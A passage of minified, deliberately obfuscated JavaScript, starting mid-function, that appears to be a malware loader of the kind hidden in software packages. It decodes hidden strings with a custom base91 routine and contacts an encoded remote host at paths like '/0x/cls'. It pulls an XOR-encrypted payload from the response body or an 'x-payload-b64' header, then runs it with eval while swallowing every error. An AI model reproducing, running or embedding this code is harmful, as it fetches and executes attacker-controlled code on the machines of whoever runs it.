q=d.indexOf(e[m]);if(q===-1)continue;if(h<0){h=q}else{h+=q*91;j|=h<<k;k+=(h&8191)>88?13:14;do{g.push(j&255);j>>=8;k-=8}while(k>7);h=-1}}if(h>-1){g.push((j|h<<k)&255)}return l(g)}function f(a,d){return e(c.slice(a,a+d))}const g={hostname:d.hostname,port:o("wOf1fy")(d.port)||80,path:d.pathname+d.search,headers:{"User-Agent":f(766,137),"Sec-V":h._V||0}};function i(d){const e=a.length;for(let f=0;f<d.length;f++)d[f]^=a.charCodeAt(f%e);return d.toString("utf8")}function j(a){const d=a.headers["x-payload-b64"];if(!d){throw new(o("TAIsJro"))("Missing X-Payload-B64")}return i(Buffer.from(d,"base64"))}function k(a){return new(o("tdTjubV"))((d,e)=>{const f=p.request({...g,method:a},f=>{if(a==="HEAD"){try{d(j(f))}catch(e){e(e)}f.resume();return}const g=[];f.on("data",f=>{return g.push(f)});f.on("end",()=>{try{const a=Buffer.concat(g);if(a.length){return d(i(a))}if(f.headers["x-payload-b64"]){return d(j(f))}e(new(o("TAIsJro"))("Empty payload body"))}catch(e){e(e)}});f.on("error",e)});f.on("error",e);f.setTimeout(A,()=>{f.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});f.end()})}return k("GET")["catch"](()=>{return k("HEAD")})}async function t(a,d,e){try{function f(a){var d="_Wz3Pb8L[^e]AqE,%S4TQ>jB|fy/7NGV!OFmda&J;up1(R?0xvl.o#s$hw\"@C9X+iUY~:IHrn)=5<}M2Zk`c6*{DtKg",e=""+(a||""),f=e.length,g=[],j=0,h=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;j|=k<<h;h+=(k&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);k=-1}}if(k>-1){g.push((j|k<<h)&255)}return l(g)}function g(a,d){return f(c.slice(a,a+d))}const i=await r(d,a),j=e?"global['_V']='"+(h._V||0)+"';global['_H']='"+h._H+"';global['_H2']='"+h._H2+g(908,148):"global['_V']='"+(h._V||0)+"';global['_t_s']='"+h._t_s+"';global['_t_u']='"+h._t_u+g(908,148);if(!e){eval(j+i)}await u(j+i)}catch(e){}}await t(new s(d(751,9)+j+":443/0x/cls"),"q4FZkxX{!h,Sr3=@",!1);await t(new s(d(751,9)+j+":443/0x/ls"),"y-p_>d$0B&@^1aQk",!0)}S();
